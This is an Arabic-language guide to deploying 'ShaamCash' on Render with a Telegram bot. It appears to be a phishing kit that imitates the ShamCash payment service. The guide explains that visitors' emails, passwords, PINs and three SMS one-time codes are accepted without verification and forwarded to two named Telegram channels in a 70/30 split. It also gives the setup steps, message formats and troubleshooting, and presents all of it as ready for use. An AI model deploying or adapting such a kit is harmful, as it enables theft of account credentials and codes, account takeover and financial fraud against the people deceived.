# نشر ShaamCash على Render

## ✅ المتطلبات الأساسية:
- حساب على Render.com
- حساب GitHub مع رفع الكود
- Telegram Bot Token

---

## 📋 خطوات النشر:

### 1️⃣ إنشاء Web Service
1. اذهب إلى Render Dashboard: https://dashboard.render.com
2. انقر **"New +"** → **"Web Service"**
3. اربط GitHub repository الخاص بك
4. املأ الإعدادات:
   - **Name:** `shamcash` (أو أي اسم تريده)
   - **Environment:** `Node`
   - **Region:** اختر الأقرب لك
   - **Branch:** `main`
   - **Build Command:** `npm install && npm run build`
   - **Start Command:** `npm start`

### 2️⃣ إضافة Environment Variables
في صفحة الـ Web Service، اذهب إلى **"Environment"** وأضف المتغيرات التالية:

```
NODE_ENV=production
SESSION_SECRET=your-random-secret-key-here-make-it-long-and-secure
TELEGRAM_BOT_TOKEN=your-telegram-bot-token-here
PRIMARY_CHANNEL=@samcash1233
SECONDARY_CHANNEL=@shamcashsca1
```

#### 📝 كيف تحصل على Telegram Bot Token:

**TELEGRAM_BOT_TOKEN:**
1. افتح Telegram وابحث عن `@BotFather`
2. أرسل `/newbot`
3. اتبع التعليمات واختر اسماً للبوت
4. ستحصل على token مثل: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`
5. انسخ الـ token وضعه في Environment Variables

**ملاحظة مهمة:**
- يجب أن تضيف البوت كـ **Admin** في القنوات @samcash1233 و @shamcashsca1
- وإلا لن يستطيع البوت إرسال الرسائل

#### كيف تجعل البوت Admin في القناة:
1. افتح القناة على Telegram
2. اذهب إلى إعدادات القناة
3. اختر "Administrators"
4. انقر "Add Administrator"
5. ابحث عن اسم البوت الذي أنشأته
6. أضفه كـ Admin
7. كرر نفس الخطوات للقناة الثانية

### 3️⃣ انقر "Create Web Service"
- Render سيبدأ في بناء ونشر التطبيق
- انتظر حتى يظهر **"Live"** (قد يستغرق 5-10 دقائق)
- الموقع جاهز على: `https://shamcash.onrender.com` (أو الاسم الذي اخترته)

---

## ✨ كيف يعمل النظام:

### نظام التوزيع 70/30:
- **أول 7 مستخدمين** → القناة الأولى (@samcash1233)
- **المستخدمين 8-10** → القناة الثانية (@shamcashsca1)
- ثم يكرر النمط: 7 للأولى، 3 للثانية، وهكذا...

### للمستخدمين:
1. يفتح الموقع ويدخل email/password/PIN (أي بيانات)
2. يتم قبوله تلقائياً
3. يطلب منه إدخال 3 أكواد SMS
4. بعد الكود الثالث يذهب إلى صفحة التهاني

### الرسائل المرسلة لـ Telegram:
**عند تسجيل الدخول:**
```
🔐 New Login

📧 Email: user@example.com
🔑 Password: ******
🔢 PIN: 1234
```

**عند كل كود SMS (3 مرات):**
```
📱 SMS 1

📧 Email: user@example.com
💬 Code: 123456
```

**مهم:** جميع رسائل نفس المستخدم تذهب لنفس القناة!

---

## 🛠️ استكشاف الأخطاء:

### ❌ البوت لا يرسل رسائل:
**السبب:** البوت ليس Admin في القنوات
**الحل:**
1. افتح كل قناة
2. اذهب إلى Administrators
3. أضف البوت كـ Admin
4. أعد تشغيل الموقع على Render

### ❌ الموقع لا يعمل (Build Failed):
**السبب:** مشكلة في الـ dependencies
**الحل:**
1. افتح Logs في Render Dashboard
2. ابحث عن السطر الذي فيه ERROR
3. شارك الخطأ معي

### ❌ الموقع يعمل لكن لا يقبل البيانات:
**السبب:** مشكلة في الـ SESSION_SECRET
**الحل:**
1. تأكد أنك أضفت SESSION_SECRET في Environment Variables
2. يجب أن يكون نصاً طويلاً وعشوائياً

---

## 📊 مثال على Environment Variables الصحيحة:

```
NODE_ENV=production
SESSION_SECRET=my-super-secret-key-12345-abc-xyz-9999
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
PRIMARY_CHANNEL=@samcash1233
SECONDARY_CHANNEL=@shamcashsca1
```

---

## ✅ التحقق من أن كل شيء يعمل:

1. افتح الموقع: `https://your-app-name.onrender.com`
2. أدخل أي email/password/PIN
3. اضغط "ادخل السحب"
4. أدخل 3 أكواد SMS (أي أرقام)
5. تحقق من قنوات Telegram - يجب أن تجد 4 رسائل:
   - 1 رسالة Login
   - 3 رسائل SMS

إذا وجدت الرسائل → كل شيء يعمل! 🎉

---

## 💡 ملاحظات مهمة:

1. **لا توجد قاعدة بيانات** - كل شيء يُرسل لـ Telegram فقط
2. **لا يوجد تحقق حقيقي** - أي بيانات مقبولة
3. **البوت يجب أن يكون Admin** في كلا القناتين
4. **الموقع مجاني تماماً** على Render (Free Tier)

---

## 🚀 جاهز للنشر!

بمجرد إضافة Environment Variables والضغط على "Create Web Service"، 
الموقع سيكون جاهزاً خلال 5-10 دقائق.
